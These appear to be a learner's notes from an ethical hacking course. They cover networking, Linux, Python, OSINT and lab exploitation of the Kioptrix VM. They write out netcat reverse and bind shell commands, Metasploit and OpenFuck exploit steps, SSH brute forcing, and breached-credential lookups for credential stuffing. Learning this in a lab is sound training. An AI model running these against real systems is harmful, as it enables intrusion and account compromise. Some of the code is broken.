
## Before We Begin

### PNPT Certification Path Progression

Many students take this course to obtain the [Practical Network Penetration Tester (PNPT)](https://certifications.tcm-sec.com/pnpt/) certification



## Introduction



### Course Introduction

Course exists since 2018. Last update in 2022.



### Course Discord (Important)

Course Discord - [TCM Security](https://discord.gg/tcm)

## 

### A Day in the Life of an Ethical Hacker



#### Assessment: External Network Pentest

- Assessing an organization's security from the outside looking in

- Methodology focused heavily on Open-Source Intelligence (OSINT) Gathering

- Typically last 32-40 hours with another 8-16 for report writing



#### Assessment: Internal Network Pentest

- Assessing an organization's security from inside of the network

- Methodology focused heavily on Active Directory attacks

- Typically last 32-40 hours with another 8-16 for report writing



#### Assessment: Web Application Pentest

- Assessing an organization's web application security

- Methodology focused heavily on web-based attacks and the OWASP testing guidelines

- Typically last 32-40 hours with another 8-16 for report writing



#### Assessment: Wireless Pentest

- Assessing an organization's wireless network security

- Methodology depends on wireless type being used (guest vs WPA2-PSK vs WPA2 Enterpreise)

- Typically last 4-8 hours per SSID with another 2-4 for report writing



#### Assessment: Physical Pentest & Social Engineering

- Assessing an organization's pysical security and / or end-user training

- Methodology depends on task and goals

- Typically last 16-40 hours with another 4-8 for report writing



#### Other Assessments

- Mobile Penetration Testing

- IoT Penetration Testing

- Read Team Engagements

- Purple Team Engagements

- Plus more



#### Report Writing

- A report is typically delivered within a week after the engagement ends

- Report shouold highlight both non-technical (executive) and technical findings

- Recommendations for remediation should be clear to both executives and technical staff



#### Debrief

- A debrief walks through your report findings. This can be with technical and non-technical staff present.

- It gives an opportunity for the client to ask questions and address any concerns before a final report is released. 



### Why You Shouldn't Be An Ethical Hacker

- Starting Salery 102'000$

- Go up fast to 140'000$

- Always have to stay up to date. Study whole time. Always new type of attacks!

- Have to be good in communication. Especially to non-technical peoples. 



## Notekeeping

### Effective Notekeeping

![[Pasted image 20221211124455.png]]

> [!hint] 
>  https://obsidian.md/

### Important Tools

> [!important] 
>  Best Screenshot Tool for Windows, Mac & Linux 
>  https://flameshot.org/#download

> [!tip] 
> Invert Screenshots if background is black if you put it into a report  

> [!info] 
> Pixelate important information such Password 

![[Pasted image 20221211144630.png]]




## Networking Refresher

### Introduction

- IP Address
- MAC Address
- TCP, UDP, and the Three-Way Handshake
- Common Ports and Protocols
- The OSI Model
- Subnetting

### IP Addresses

> [!info] 
> IP Address is on OSI Layer 3 

> [!hint] 
>  Show IP Information in Linux
`ifconfig`

![[Pasted image 20221211155524.png]]


### MAC Addresses

> [!abstract] 
> MAC stands for Media Access Control 

> [!info] 
> MAC Address is on OSI Layer 2 and is related to switching 

> [!hint] 
> Mac Address Lookup:
> https://maclookup.app/ 


## TCP, UDP, and the Three-Way Handshake

> [!abstract] 
> TCP = Transmission Control Protocol
> UDP = User Datagram Protocol 

> [!info] 
> TCP & UDP Is on OSI Layer 4 

> [!note] 
> **How does a Three-Way Handshakre look like:**
> SYN > SYN ACK > ACK
> 
> Hello > Hey SYN I acknowledge you (neighbor waving hello back)  > Acknowledgement (Start Conversation)
> 


## Common Ports and Protocols

> [!abstract] 
> **TCP:**
> -  FTP (21)
> - SSH (22)
> - Telnet (23)
> - SMTP (25)
> - DNS (53)
> - HTTP (80) / HTTPS (443)
> - POP (110)
> - SMB (139+445)
> - IMAP (143)

> [!abstract] 
> **UDP:** 
> - DNS (53)
> - DHCP (67, 68)
> - TFTP (69)
> - SNMP (161)



### The OSI Model

> [!hint] 
> OSI Seven Layers (**p**lease **d**o **n**ot **t**hrow **s**ausage **p**izza **a**way) 
> 1 -> Physical Layer - Data Cables, Cat6
> 2 -> Data Layer - Switching, MAC Address
> 3 -> Network Layer - IP Address, Routing
> 4 -> Transport Layer - TCP/UDP 
> 5 -> Session Layer - Session Management
> 6 -> Presentation Layer -> WMV, JPEG, MOV
> 7 -> Application Layer -> HTTP, SMTP


### Subnetting Part 1

> [!tip] 
> Subnet Guide (Excel)
> https://drive.google.com/file/d/1ETKH31-E7G-7ntEOlWGZcDZWuukmeHFe/view 
>
> [[Subnet-Guide.xlsx]]

![[Pasted image 20221211171634.png]]

![[Pasted image 20221211171852.png]]

![[Pasted image 20221211173023.png]]


> [!tip] 
> IP Address Guide:
> https://www.ipaddressguide.com/cidr 

![[Pasted image 20221211180441.png]]

#### Seven Second Subnetting

> [!hint] 
> Professor Messer - Seven Second Subnetting 
> https://www.youtube.com/watch?v=ZxAwQB8TZsM

![[Pasted image 20221211182030.png]]
![[Pasted image 20221211182202.png]]
![[Pasted image 20221211182459.png]]
![[Pasted image 20221211182754.png]]
![[Pasted image 20221211182902.png]]
![[Pasted image 20221211192715.png]]
![[Pasted image 20221211192819.png]]
![[Pasted image 20221211193102.png]]


## Subnetting Part 2

![[Pasted image 20221211195803.png]]


## Setting Up Our Lab

### Installing VMWare / VirtualBox


> [!summary] 
> VMware: [https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html](https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html)
>VirtualBox: [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads)


### Configuring VirtualBox

> [!info] 
> Create new NAT Network for every VM
> 


### Installing Kali Linux

> [!summary] 
> Download Kali - [https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali#kali-virtual-machines)
> Download 7zip - [https://www.7-zip.org/download.html](https://www.7-zip.org/download.html)


## Introduction to Linux

### Exploring Kali Linux

> [!summary] 
> Kali Linux is an open-source, Debian-based Linux distribution geared towards various information security tasks, such as Penetration Testing, Security Research, Computer Forensics and Reverse Engineering. 

![[Pasted image 20221217135615.png]]


### Sudo Overview

> [!note] 
> Show Password File in Linux
>`cat /etc/shadow` -> Permission denied
>  `sudo cat /etc/shadow` -> You see content because your root (after type root password)

> [!note] 
> Run current session in Terminal always as root:
> `sudo su -`
> 

![[Pasted image 20221217140635.png]]


### Navigating the File System

> [!note] 
> Show current path in terminal:
> `pwd`
> -> /home/kali 

> [!note] 
> Change dictionary:
> `cd ..` ->  Go one folder up
>  `cd nameOfFolder` -> Go into this folder
>  `cd /home/kali` -> Go into this folder by absolute path

> [!note] 
> List content of current folder:
> `ls` -> Simple folder listing
> `ls -la` -> Complex folder listing including file permissions

> [!note] 
> Create Folder:
> `mkdir myNewFolderName` 

> [!note] 
> Remove Folder:
> `rmdir myNewFolderName`

> [!hint] 
>explainshell.com 
>Write down a command-line to see the help text that matches each argument 
 https://explainshell.com 

![[Pasted image 20221217142755.png]]

> [!note] 
> Show Help (Manual) for a command:
> `man ls` 
> `man mkdir`
> or 
> `ls --help`
> `mkdir --help`

> [!note] 
> Print out String:
> `echo 'Hi!'` 
>  `echo 'Hi!' > test.txt` -> Save this Text to file test.txt
> ` cat test.txt
`

> [!note] 
> Copy file to other folder:
>  `cp test.txt Downloads`

> [!note] 
>  Delete File
> ` rm Downloads/test.txt`

> [!note] 
> Move file to other location 
> `mv test.txt Downloads` 

> [!note] 
>  Locate file (search where a file is)
>  `locate test.txt`
>But as we just created this file, locate DB is not updated.
>`sudo updatedb` -> Index all files 

> [!note] 
> Change Password for current user
> `passwd`
> 


### Users and Privileges

![[file_permission_image2-3130722148.png]]

![[c16b1-permissions-1771186171.jpg]]

> [!note] 
> Change Permission of file:
> `chmod +rwx script.sh`  -> Read, write, execute permissions
> or
>` chmod 777 script.sh -> Full permisson for everyone`

![[Pasted image 20221217150406.png]]

> [!note] 
> Add new user to system
> `sudo adduser john` -> You need sudo password, after password for new user
> Now use john account
> `su john`

> [!important] 
> /etc/passwd explained  

![[etc_passwd-4204861671.png]]

> [!important] 
> /etc/shadow explained 

![[shadow-file-format-022022-01-4257132506.png]]

> [!note] 
> Edit sudo
> `sudo cat /etc/sudoers`
> Find out which group has sudo:
> `grep 'sudo' /etc/group`
> Check places I can execute commands with current user:
>` sudo -l`


### Common Network Commands

> [!note] 
> Show IP Information (ip a is new way)
> `ip a` 
> or old way
> `ifconfig`

> [!note] 
> Show Wlan Adapter  
> `iwconfig`

> [!note] 
> Show ARP information
> `ip n`
> or 
> `arp a` 

> [!hint] 
> ARP is telling which IP Address has which MAC Address
> 

> [!note] 
> Kernel IP routing table
> `route`
> 


### Viewing, Creating, and Editing Files

> [!note] 
> Write Text to File 
> `echo "hallo" > hey.txt` 
> To add text to existing file:
>  `echo "hallo" >> hey.txt` 

> [!note] 
> Create new empty file
> `touch newfile.txt` 

> [!tip] 
> Use `nano` editor in terminal to edit files
> 

> [!hint] 
> Open file  in GUI Editor
> `gedit newfile.txt`
> New GUI Editor alternative:
> `mousepad newfile.txt`
> 
> 


### Starting and Stopping Services

> [!note] 
> Start apache2 webserver
> `sudo service apache2 start` 
> Stop apache2 webserver
> `sudo service apache2 stop` 
> Path to www root
> `cd /var/www/html`

> [!tip] 
> Start Webserver in current folder
> `python3 -m http.server 80` 


> [!note] 
> Enable SSH Service
> `sudo systemctl enable ssh`
> Disable SSH Service
> `sudo systemctl disable ssh`


### Installing and Updating Tools

> [!note] 
> Update Kali Linux System via apt
> `sudo apt update && sudo apt upgrade` 

> [!tip] 
> With apt command you can install new software:
> `apt install nameOfSoftwareToInstall` 

> [!hint] 
> Example to find new software: Google for "Office 365 brute force github" 

> [!important] 
>  Pimpmykali Script from GitHub:
>  https://github.com/Dewalt-arch/pimpmykali
>  `git clone https://github.com/Dewalt-arch/pimpmykali.git`
>  `sudo ./pimpmykali.sh`
>  

![[Pasted image 20221218171941.png]]


### Scripting with Bash

> [!tip] 
> Create Sash Script for IP Sweep using OpenAI:
> https://chat.openai.com/chat

``` 
#!/bin/bash

# Set the range of IP addresses to scan
ip_range="192.168.1.1-255"

# Set the Slack webhook URL
webhook_url="https://hooks.slack.com/services/YOUR/WEBHOOK/URL"

# Use nmap to perform the IP sweep
nmap -sP $ip_range | while read line
do
  # Check for online or offline status
  if [[ $line =~ "Host is up" ]]
  then
    # Send message to Slack indicating that a device is online
    curl -X POST -H 'Content-type: application/json' --data '{"text":"A device has come online"}' $webhook_url
  elif [[ $line =~ "Host is down" ]]
  then
    # Send message to Slack indicating that a device is offline
    curl -X POST -H 'Content-type: application/json' --data '{"text":"A device has gone offline"}' $webhook_url
  fi
done
```

![[Pasted image 20221218175259.png]]
![[Pasted image 20221218175325.png]]

And here Solution from Course:

``` 
#!/bin/bash
if [ "$1" == "" ]
then
echo "You forgot an IP address!"
echo "Syntax: ./ipsweep.sh 192.168.1"

else
for ip in `seq 1 254`; do
ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" & 
done
fi
```


> [!note] 
> Store Results to text file
> `./ipsweep.sh 192.168.2 > ips.txt` 



## Introduction to Python

### Introduction

![[Pasted image 20221223145037.png]]


### Strings

``` 
#!/bin/python3

#Print string
print("Hello, World!")
print('Hello, World!')
print("""This string runs
multiple lines!""")
print("This string is "+"awesome!")
print("\n") # print new line
print("Test that new line out.")
```


### Math

``` 
#!/bin/python3

print(50 + 50) # add
print(50 - 50) # subtract
print(50 * 50) # multiply
print(50 / 50) # divide
print(50 + 50 - 50 * 50 / 50) # PEMDAS
print(50 ** 2) # exponents
print(50 % 6) # modulo - takes what is left over
print(50 / 6) #division with remainder (or a float)
print(50 // 6) # no remainder
```


### Variables and Methods

``` 
#!/bin/python3

quote = "All is fair in love and war"
print(quote)
print(quote.upper()) # uppercase
print(quote.lower()) # lowercase
print(quote.title()) # title case
print(len(quote)) # counts characters
name = "Peter" # string
age = 33 # int
gpa = 3.7 # float - has a devimal
print(int(age))
print(int(30.1))
print(int(30.9)) # Will it round? NO.
print("My name is " + name + " and I am " + str(age) + " years old.")
age += 1
print("My name is " + name + " and I am " + str(age) + " years old.")
birthday = 1
age += birthday
print("My name is " + name + " and I am " + str(age) + " years old.")
```


###  Functions

``` 

#!/bin/python3

def who_am_i(): # this is a fuction without parameters
   name = "Peter" # local variable
   age = 30
   print("My name is " + name + " and I am " + str(age) + " years old.")

who_am_i()

def add_one_hundred(num):
   print(num + 100)

add_one_hundred(100)

def add(x,y):
   print(x + y)

add(7,7)

def multiply(x,y):
   return x * y

print(multiply(7, 7))

def square_root(x):
   print(x ** .5)

square_root(64)

def new_line():
   print("\n")
  
new_line()
```


###  Boolean Expressions and Relational Operators

![[Pasted image 20221223171602.png]]

``` 
#!/bin/python3

bool1 = True
bool2 = 3*3 == 9
bool3 = False
bool4 = 3*3 != 9
print(bool1, bool2, bool3, bool4)
print(type(bool1))
bool5 = "True"
print(type(bool5))

greater_than = 7 > 5
less_than = 5 < 7
greater_than_equal_to = 7 >= 7
less_than_equal_to = 7 <= 7

test_and = (7 > 5) and (5 < 7) # True
test_and2 = (7 > 5) and (5 > 7) # False
test_or = (7 > 5) or (5 < 7) # True
test_or2 = (7 > 5) or (5 > 7) # True
  
test_not = not True # False
```


### Conditional Statements

``` 
#!/bin/python3

def drink(money):
   if money >= 2:
      return "You've got yourself a drink!"
   else:
      return "No drink for you!"

print(drink(3))
print(drink(1))

def alcohol(age,money):
    if (age >= 21) and (money >= 5):
      return "We're getting a drink!"
   elif (age >= 21) and (money < 5 ):
      return "Come back with more money"
   elif (age < 21) and (money >= 5):
      return "Nice try, kid!"
   else:
      return "You're too young and too poor."

print(alcohol(21, 5))
print(alcohol(21, 2))
print(alcohol(19, 5))
print(alcohol(19, 1))
```


## Lists


``` 
#!/bin/python3

movies = ["When Harry Met Sally", "The Hangover", "SWAT", "The Rock"]
print(movies[0]) # return first item in list
print(movies[1]) # return second item in list
print(movies[1:3]) # return first index number given right until last number, but not include last number
print(movies[1:])
print(movies[:1])
print(movies[-1])
print(len(movies)) # count items in the list

movies.append("JAWS")
print(movies) # appends to the end of the list

movies.insert(2, "Hustle")
print(movies)

movies.pop() # removes the last item
print(movies)

movies.pop(0) # removes the first item
print(movies)

amber_movies = ['Matrix 1', 'Matrix 2']
our_favorites_movies = movies + amber_movies
print(our_favorites_movies)

grades = [["Bob", 82], ["Alice", 90], ["Jeff", 73]]
bobs_grades = grades[0][1]
print(bobs_grades)
grades[0][1] = 83
print(grades)
```


### Tuples

``` 
#!/bin/python3

# TUPLES - Do not change, ()
grades = ("a", "b", "c", "d", "f")
print(grades[1])
```

## Looping

``` 
#!/bin/python3

# For loops - start to finish of a iterate
vegetables = ["tomato", "spinach", "cabbage"]
for x in vegetables:
   print(x)

# ip = 1..254
# for x in ip:
#  ping 192.168.1.x
  

# While loops - execute as long as True
i = 1
while i < 10:
   print(i)
   i += 1
```


### Advanced Strings

``` 
#!/bin/python3

my_name = "Peter"
print(my_name[0]) # first letter
print(my_name[-1]) # last letter

sentence = "This is a sentence."
print(sentence[:4])
print(sentence.split()) # delimeter - default is a space

sentence_split = sentence.split()
sentence_join = ' '.join(sentence_split)
print(sentence_join)

quote = 'He said, "give me all your money"'
print(quote)

quote = "He said, \"give me all your money\""
print(quote)

too_much_space = " hello "
print(too_much_space.strip())

print("A" in "Apple") # True
print("a" in "Apple") # False

letter = "A"
word = "Apple"
print(letter.lower() in word.lower()) # improved

movie = "The Rock"
print("My favorite movie is {}.".formatmovie))

print("My favorite movie is %s" % movie)
print(f"My favorite movie is {movie}.")
```


### Dictionaries

``` 
#!/bin/python3

drinks = {"White Russian" : 7, "Old Fashioned": 10, "Beer": 1} # drink is key, price is the value
print(drinks)

employees = {"Finance": ["Bob", "Linda", "Tina"], "IT": ["Teddy", "Peter", "Hans"], "HR": ["Jimmy", "Mort"]}
print(employees)

employees['Legal'] = ["Mr. Frond"] # adds new key value pair
print(employees)
  
employees.update({"Sales": ["Andie", "Oli"]})
print(employees)

drinks['White Russian'] = 8
print(drinks)
print(drinks.get("White Russian"))
```


### Importing Modules

``` 
#!/bin/python3

import sys # system functions and parameters
from datetime import datetime as dt # import with alias

print(sys.version)
print(dt.now())
```


### Sockets

``` 
#!/bin/python3

import socket

HOST = '127.0.0.1'
PORT = 7777

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET is ipv4, SOCK_STREAM is a port
s.connect((HOST,PORT))
```


### Building a Port Scanner


``` 
#!/bin/python3

import sys
import socket
from datetime import datetime

# Define our target
if len(sys.argv) == 2:
   target = socket.gethostbyname(sys.argv[1]) # Translate hostname to IPv4
else:
   print("Invalid amount of arguments.")
   print("Syntax: python3 scanner.py <ip>")

#Add a pretty banner
print("-" * 50)
print("Scaning target " + target)
print("Time started: " +str(datetime.now()))
print("-" * 50)

try:
for port in range(1,65535):
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   socket.setdefaulttimeout(1)
   result = s.connect_ex((target, port))

   if result == 0:
      print(f"Port {port} is open")
   s.close()

except KeyboardInterrupt:
   print("\n Exiting program.")
   sys.exit()

except socket.gaierror:
   print("Hostname could not be resolved.")
   sys.exit()

except socket.error:
   print("Could not connect to server.")
   sys.exit()
```


### User Input

``` 
#!/bin/python3

name = input("Enter your name: ")
drink = input("What is your favorite drink? ")
print(f"Hello {name}! Have a {drink}")
```

``` 
#!/bin/python3

x = float(input("Give me a number: "))
o = input("Give me an operator: ")
y = float(input("Give me yet another number: "))

if o == "+":
   print(x + y)
elif o == "-":
   print(x - y)
elif o == "/":
   print(x / y)
elif o == "*":
   print(x * y)
elif o == "**" or o == "^":
   print(x ** y)
else:
   print("Unknown operator.")
```


### Reading and Writing Files

``` 
#!/bin/python3

months = open('months.txt')
print(months)
print(months.mode)
print(months.readable())
print(months.readline())
print(months.readline())
print(months.readlines())
print(months.readlines())
print(months.seek(0))
print(months.readlines())
print(months.seek(0))

for month in months:
   print(month.strip())

months.close()
```

``` 
#!/bin/python3

days = open('days.txt', "w") # write / override
days = open('days.txt', "a") # add to existing file
print(days)
print(days.mode)

days.write("Monday")
days.write("\nTuesday")

days.close()
```


### Classes and Objects

``` 
class Employees:

def __init__(self, name, department, role, salery, years_employed):
   self.name = name
   self.deparment = department
   self.role = role
   self.salery = salery
   self.years_employed = years_employed

def eligible_for_retirement(self):
   if self.years_employed >= 20:
      return True
   else:
      return False
```

``` 
#!/bin/python3

from Employees import Employees

e1 = Employees("Bob", "Sales", "Director of Sales", 100000, 20)
e2 = Employees("Linda", "Executive", "CIO", 150000, 10)

print(e1.name)
print(e2.role)

print(e1.eligible_for_retirement())
print(e2.eligible_for_retirement())
```

### Building a Shoe Budget Tool

``` 
#!/bin/python3

class Shoes:

def __init__(self, name, price):
   self.name = name
   self.price = float(price)

def budget_check(self, budget):
   if not isinstance(budget, (int, float)):
      print('Invalid entry. Please enter a number.')
      exit()

def change(self, budget):
   return (budget - self.price)

def buy(self, budget):
   self.budget_check(budget)
   if budget >= self.price:
      print(f'You can cop some {self.name}')
      if budget == self.price:
         print('You have exactly enough money for these shoes.')
      else:
         print(f'You can buy these shoes and have ${self.change(budget)} left over')
      exit('Thanks for using our shoe budget app!')
```


``` 
#!/bin/python3

from Shoes import Shoes

low = Shoes('Heels', 30)
medium = Shoes('Boots', 120)
high = Shoes('Sexy Heels', 400)

try:
   shoe_budget = float(input('What is your shoe budget? '))

except ValueError:
   exit('Please enter a number')

for shoes in [high, medium, low]:
   shoes.buy(shoe_budget)
```


## The Ethical Hacker Methodology

### The Five Stages of Ethical Hacking

![[Pasted image 20221224141322.png]]


## Information Gathering (Reconnaissance)

### Passive Reconnaissance Overview

![[Pasted image 20221224141847.png]]

> [!hint] 
> Live Satellite images
> https://zoom.earth/
> 

![[Pasted image 20221224150033.png]]


### Identifying Our Target

> [!hint] 
> Bug Bounty
> https://bugcrowd.com/programs 


### Discovering Email Addresses

> [!hint] 
> hunter.io to find E-Mails
> https://hunter.io/ 

![[Pasted image 20221224163352.png]]

> [!hint] 
>  https://phonebook.cz

![[Pasted image 20221224165407.png]]

> [!tip] 
> Useful for Password Sprying
> 

> [!hint] 
> https://clearbit.com/ Chrome Extension 
 

![[Pasted image 20221224170625.png]]

![[Pasted image 20221224170711.png]]

![[Pasted image 20221224170807.png]]

> [!hint] 
> ## Free email address verification tool
> https://tools.emailhippo.com/ 

![[Pasted image 20221224171400.png]]

> [!hint] 
> # Email Checker
> A simple tool to check whether an email address exists.
> https://email-checker.net/

![[Pasted image 20221224171609.png]]



> [!important] 
> Use Gmail Login Form to see if E-Mail Address is valid. If you come to this screen, it means Gmail Address is existing.  

![[Pasted image 20221224171848.png]]

> [!hint] 
> Make a Password Reset 

![[Pasted image 20221224172034.png]]


### Gathering Breached Credentials with Breach-Parse

> [!hint] 
> breach-parse from TCM Security
> https://github.com/hmaverickadams/breach-parse
> 

![[Pasted image 20221225085336.png]]
![[Pasted image 20221225085530.png]]


### Hunting Breached Credentials with DeHashed


> [!tip] 
>  https://dehashed.com/

![[Pasted image 20221225090829.png]]

![[Pasted image 20221225091138.png]]

> [!tip] 
> Searching for the hashed password on the website might take you to another name, such as the private account of the employee in question. It could also reflect the real password instead of the hashed password. 


> [!hint] 
> Hash to Password
> https://crackstation.net/
> 


### Hunting Subdomains Part 1

> [!info] 
> Install sublist3r tool:
> `sudo apt install sublist3r`
> 

![[Pasted image 20221225100424.png]]

> [!info] 
> Cert Search: https://crt.sh/
> 


### Hunting Subdomains Part 2



> [!hint] 
> In-depth Attack Surface Mapping and Asset Discovery
> https://github.com/OWASP/Amass 

![[Pasted image 20221225112445.png]]


> [!hint] 
> Take a list of domains and probe for working HTTP and HTTPS servers
>  https://github.com/tomnomnom/httprobe


### Identifying Website Technologies

> [!tip] 
> Online Check Web Technologies of Website:
> https://builtwith.com
> 

![[Pasted image 20221225135834.png]]

> [!hint] 
> Identify technologies on websites
> https://www.wappalyzer.com/ 
> (They have a good browser plugin)

> [!tip] 
> Kali Terminal
> `whatweb https://example.com` 
> Get Information about Website

![[Pasted image 20221225141254.png]]


### Information Gathering with Burp Suite

![[Pasted image 20221226121247.png]]


### Google Fu

> [!hint] 
> Google Search Operators: The Complete List (42 Advanced Operators)
> https://ahrefs.com/blog/google-advanced-search-operators/


### Utilizing Social Media

> [!hint] 
> Twitter and LinkedIn are good places to find Employee information.
> 

![[Pasted image 20221226152108.png]]

> [!tip] 
> Look for Badges, Notes on Desk or what kind of IT tools / OS they use. 

> [!hint] 
> If there is a big company, there is a big chance that someone of Employees use weak password. You can identify persion in data breach.
> 

> [!warning] 
> Information gathering is a very important part of penetration testing work!  


### Additional Learning (OSINT Fundamentals)

![[Pasted image 20221226154340.png]]


## Scanning & Enumeration


### Installing Kioptrix


> [!info] 
> Kioptrix Download - [https://tcm-sec.com/kioptrix](https://tcm-sec.com/kioptrix)
> 


> [!tip] 
> To find IP, you can login with `john` and `TwoCows2`.
> You can use ping to find out IP of VM. 


### Scanning with Nmap

> [!tip] 
>  Network discovery with arp-scan
>  `arp-scan -l`
>  or
>  `udo arp-scan -l -I vmnet8`

![[Pasted image 20221226160315.png]]

> [!note] 
> Scan Network with netdiscover
> `sudo netdiscover -r 192.168.2.0/24`
> 

![[Pasted image 20221226161520.png]]

> [!info] 
> # 3-Way Handshake - Accept Connection
> SYN SYNACK ACK
> 
> # Abort Connection
> SYN SYNACK RST 

> [!todo] 
> nmap Scan of VM:
> nmap -T4 -p- -A 172.16.215.128
> 

> [!todo] 
> nmap Scan of UDP:
> ` sudo nmap -sU -sV -T4 -p1000  172.16.215.128` 


### Enumerating HTTP and HTTPS Part 1

> [!info] 
> Poor Hygiene:
> Searching for a standard web server page tells us something about the technical hygiene of our customer. You should not run a web server if you do not use a web server. 
> 

![[Pasted image 20221226165042.png]]

> [!info] 
> Information Dislclosure of Webserver Version 

![[Pasted image 20221226165410.png]]

> [!important] 
> Nikto Scan:
> `nikto -url "http://172.16.215.128/"` 


### Enumerating HTTP and HTTPS Part 2

> [!info] 
> DirBuster Enumeration 

![[Pasted image 20221226171851.png]]



### Enumerating SMB

> [!tip] 
> enum4linux scan:
> `enum4linux 172.16.215.128` 

![[Pasted image 20221226173530.png]]

> [!info] 
> To start Metasploit:
> run `msfconsole` 

![[Pasted image 20221226174357.png]]

> [!info] 
> auxiliary = scanning / enumeration 
> post = post exploitation modules
> exploits = get shell on machine

> [!todo] 
> Search for SMB scanner:
> `search smb type:auxiliary`
> Use Modul:
> `use auxiliary/scanner/smb/smb_version` 
>`show options` 
>`set rhost 172.16.215.128`
>`run`

![[Pasted image 20221226175739.png]]

> [!info] 
> Anonymously connect to the SMB server:
>  `smbclient -L \\\\172.16.215.128`

![[Pasted image 20221226180058.png]]

> [!info] 
> Try to connect to ADMIN$ shared folder:
>  `smbclient  \\\\172.16.215.128\\ADMIN$`

![[Pasted image 20221226180525.png]]

> [!info] 
> Try to connect to IPC$ shared folder (normally isn't so helpful this one): 
> `smbclient  \\\\172.16.215.128\\IPC$ `

![[Pasted image 20221226180652.png]]

> [!note] 
> Nothing to see here...
> 


### Enumerating SSH


> [!important] 
> Sometimes old SSH Server will have this Error Message:
> `Unable to negotiate with 172.16.215.128 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
`

![[Pasted image 20221226203834.png]]

> [!attention] 
> It didn't work as they showed in Video. But this here is working for me:
> `ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa  -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc  172.16.215.128
` 


### Researching Potential Vulnerabilities


> [!tip] 
> Google for Exploit:
> `mod_ssl 2.8.4 exploit`
> `samba 2.2.1a exploit`

> [!hint] 
> Use searchsploit in Terminal:
> `searchexploit` # go to exploit folder on your kali machine
> `searchsploit Samba` 
> `cat exploits/linux_x86/dos/36741.py` # direct access to exploit on your machine

![[Pasted image 20221226210218.png]]

![[Pasted image 20221226210803.png]]


### Our Notes So Far

![[Pasted image 20221226211017.png]]




## Vulnerability Scanning with Greenbone Community Edition (OpenVAS)

> [!info] 
>  Tutorial how to Setup Docker OpenVAS
>  https://greenbone.github.io/docs/latest/index.html
>  Start OpenVAS Docker
>  `docker-compose -f ~/Scripts/OpenVAS/docker-compose.yml -p greenbone-community-edition up -d`
>  

![[Pasted image 20221226222439.png]]


## Vulnerability Scanning with Nessus


### Scanning with Nessus Part 1

> [!info] 
>  Download Nessus:
>  https://www.tenable.com/downloads/nessus?loginAttempted=true
>  Install it:
>  `sudo dpkg -i Nessus-10.4.1-ubuntu1404_amd64.deb`
>  Start Nessus Service:
>  `/bin/systemctl start nessusd.service`
>  Open in browser:
>  `https://hostname:8834/#/`
>  Choose Nessus Essentials

![[Pasted image 20221226222505.png]]


### Scanning with Nessus Part 2

![[Pasted image 20221226224135.png]]

> [!tip] 
> Go and check founded version numbers manually by yourself. Don't trust vuln scanner on this.  


## Exploitation Basics


### Reverse Shells vs Bind Shells

![[Pasted image 20221227104723.png]]
![[Pasted image 20221227105144.png]]


> [!note] 
> **Reverse Shell:**
> Open Netcat listener:
> `nc -nvlp 4444`
> Connect to listener:
>  `nc 192.168.2.133 4444 -e /bin/bash`

> [!note] 
> **Bind Shell:** 
> On victim:
> `nc -nvlp 4444 -e /bin/bash`
> On attacker:
> `nc 192.168.2.133 4444`


### Staged vs Non-Staged Payloads

![[Pasted image 20221227110739.png]]

> [!caution] 
> If exploit isn't working, try other type of payload! 


### Gaining Root with Metasploit

> [!todo] 
>  `searchsploit samba 2.2 `
>  `msfconsole`
>  `search trans2open`
>  `use 1`
>  `show options`
>  `set rhost  172.16.215.1`
>  `run`
>  Isn't working. We have to change payload
>  `set payload linux/x86/`
>  `set payload linux/x86/shell_reverse_tcp`
>  `show options`
>  `run` or `exploiot`


![[Pasted image 20221227111500.png]]
![[Pasted image 20221227111621.png]]

![[Pasted image 20221227112420.png]]
![[Pasted image 20221227112720.png]]
![[Pasted image 20221227113010.png]]


### Manual Exploitation

> [!note] 
> Google OpenLuck:
> https://github.com/heltonWernik/OpenLuck
> 

> [!todo] 
> `git clone https://github.com/heltonWernik/OpenFuck.git` 
> `apt-get install libssl-dev`
> `cd OpenFuck`
> `gcc -o OpenFuck OpenFuck.c -lcrypto`
> `./open 0x6a 192.168.80.145 443 -c 40`
> `./open 0x6b 172.16.215.128 -c 40`

![[Pasted image 20221227132312.png]]


### Brute Force Attacks


> [!todo] 
> Hydra Brute Force SSH:
> `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://172.16.215.128:22 -t 4 -V
` 

> [!attention] 
> Hydra didn't work with this SSH Server. In Video it's working.  

> [!todo] 
>  SSH Burte Force SSH via Metasploit
>  `msfconsole`
>  `search ssh`
>  `use auxiliary/scanner/ssh/ssh_login`
>  `show options`
>  `set username root`
>  `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt`
>  `set rhost 172.16.215.128`
>  `set threads 10`
>  `set verbose true`
>`run`

![[Pasted image 20221227145327.png]]


### Credential Stuffing and Password Spraying

![[Pasted image 20221227145849.png]]

> [!tip] 
> Install FoxyProxy in Firefox or Chrome:
> https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-standard/
> 

> [!todo] 
> Get breached credentials:
> `breach-parse tessla.com tessla.txt`

![[Pasted image 20221227151810.png]]
![[Pasted image 20221227151854.png]]
![[Pasted image 20221227152001.png]]
![[Pasted image 20221227152157.png]]
![[Pasted image 20221227152242.png]]
![[Pasted image 20221227152324.png]]


### Our Notes, Revisited

![[Pasted image 20221227163027.png]]
![[Pasted image 20221227163231.png]]


## New Capstone

> [!info] 
> Old PEH Capstone VMs:
> https://drive.google.com/drive/folders/1VXEuyySgzsSo-MYmyCareTnJ5rAeVKeH
> DEV VM:
> https://cdn.fs.teachablecdn.com/XyWGk3BwRMWhth526GV0
> Old Capstone Videos:
> https://www.youtube.com/watch?v=JZN3JhoAdWo&list=PLLKT__MCUeiyxF54dBIkzEXT7h8NgqQUB&ab_channel=TheCyberMentor
> 


![[Pasted image 20221227164253.png]]


### Set Up - Blue

> [!info] 
> 2GB Ram is enouth
> Set NAT Network Settings
> 

> [!faq] 
